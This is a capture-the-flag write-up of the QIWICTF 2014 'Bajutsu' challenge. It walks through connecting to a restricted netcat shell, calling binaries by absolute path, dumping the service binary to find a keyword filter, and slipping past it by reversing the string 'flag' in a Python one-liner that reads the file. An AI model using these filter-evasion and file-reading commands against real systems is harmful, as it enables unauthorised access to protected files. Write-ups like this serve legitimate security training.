---
title: "QIWICTF 2014 - Bajutsu (Pwn100)"
tags:
  - qiwictf2014
  - writeup
  - pwn
---

*cat flag on port 2222 at qiwictf2014.ru*

```shell
$ nc qiwictf2014.ru 2222
echo "Hello"
Hello
ls
cat flag
$
```

Now if we try to connect, it seems like we got a shell. However, the shell is
extremely restricted. It seems we can only use echo.<!--more-->

However, it is possible that the PATH variable just isn't set for us to access
bins that way. Let's try full paths:

```shell
$ nc qiwictf2014.ru 2222
/bin/ls
bajutsu
flag
$
```

Works. Now we can use the full power of /bin/ and /usr/bin. Let's try the
obvious thing:

```shell
$ nc qiwictf2014.ru 2222
/bin/cat flag
$
```

Nope. Probably filtering of some kind. Let's check if the command's even
available:

```shell
$ nc qiwictf2014.ru 2222
/bin/cat --help
$
```

Nope. Python might be available though, then we're totally set to pwn.

```shell
$ nc qiwictf2014.ru 2222
/usr/bin/python -c 'print "Test"'
Test
$
```

Great it is available. Let's try the obvious thing:

```shell
$ nc qiwictf2014.ru 2222
/usr/bin/python -c 'print file("flag").read()'
$
```

Nothing. Probably the filtering. I guessed that it was probably restricting the
word 'flag' but let's confirm that. We can dump the binary using:

```shell
$ nc qiwictf2014.ru 2222
/usr/bin/python -c 'print file("bajutsu").read()'
$
```

Doing some reversing, we find that the following configuration is passed to a
tcp wrapper thing:

```shell
"accept tcp {\naddress 0.0.0.0\nport 2222\n} wrap console {\ncmd \"/bin/bash\"\n}filters {\nto-service-filter {\naction \"cut\"\nregex {\"cat\"\n\"flag\"\n}}}"
```

Cool we were right, the words 'flag' and 'cat' are filtered. So all we need to
do now is just fudge the word 'flag':

```shell
$ nc qiwictf2014.ru 2222
/usr/bin/python -c 'print file("galf"[::-1]).read()'
ZN2014_226BDE035EAA91DDBCEB7883199E30AA


$
```

And we have our flag. Thanks MSLC for the great challenge.

Flag: **ZN2014\_226BDE035EAA91DDBCEB7883199E30AA**
